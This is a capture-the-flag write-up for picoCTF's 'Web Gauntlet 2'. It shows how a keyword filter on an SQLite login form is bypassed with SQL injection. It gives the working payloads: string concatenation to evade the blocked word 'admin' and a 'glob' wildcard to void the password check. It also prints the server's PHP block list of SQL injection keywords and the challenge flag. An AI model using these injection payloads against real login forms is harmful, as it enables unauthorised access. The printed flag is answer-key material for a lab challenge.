# Web Gauntlet 2
Category: Web, 170 points

## Description

> This website looks familiar... Log in as admin
>
> Filtered: or and true false union like = > < ; -- /* */ admin
> 
> Hint: sqlite

## Solution

This is a follow-up for last year's [Web Gauntlet](https://github.com/Dvd848/CTFs/blob/master/2020_picoCTF_Mini/Web_Gauntlet.md).

The attached website gives us a standard login form. If we enter credentials we even get the SQL query run on the server. An example after entering `user` and `pass`:

```
SELECT username, password FROM users WHERE username='user' AND password='pass' 
```

We can enter a `'` sign in both the `username` and `password` fields to escape the query:

```
SELECT username, password FROM users WHERE username=''' AND password=''' 
```

But if we enter one of the filtered entities, we get blocked.

We want to login as `admin`, but entering `admin` as plaintext gets blocked. The easy bypass is to use `||` for concatenation and send `a'||'dmin` as the username:

```
SELECT username, password FROM users WHERE username='a'||'dmin' AND password='pass' 
```

However, we still need to somehow neutralize the password check. The `except` keyword should be able to do that, so by sending `a'||'dmin' except select * from users where username='` we would get:

```
SELECT username, password FROM users WHERE username='a'||'dmin' except select * from users where username='' AND password='pass' 
```

This means that we should get back any user that has the username of `admin` except for users which have an empty username and a password of `pass`, which in practice should just give us the admin. However, this query got blocked due to a new constraint: `"Combined input lengths too long! (> 35)"`.

Eventually, the following query did the job:

```
username: adm'||'in
password: ' glob '*

Full query:

SELECT username, password FROM users WHERE username='adm'||'in' AND password='' glob '*' 
```

The `glob` keyword is used to match text values against a pattern using wildcards. Since we provided the `*` wildcard, we are saying: Give us a user with the username `admin` and any password.

Once we were able to bypass the authentication query, we got the following response from the server:

```php
<?php
session_start();

if (!isset($_SESSION["winner2"])) {
    $_SESSION["winner2"] = 0;
}
$win = $_SESSION["winner2"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner2"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner2"] = 0;
}

// picoCTF{0n3_m0r3_t1m3_86f3e77f3c5a076866a0fdb3b29c52fd}
?>
```

The flag: `picoCTF{0n3_m0r3_t1m3_86f3e77f3c5a076866a0fdb3b29c52fd}`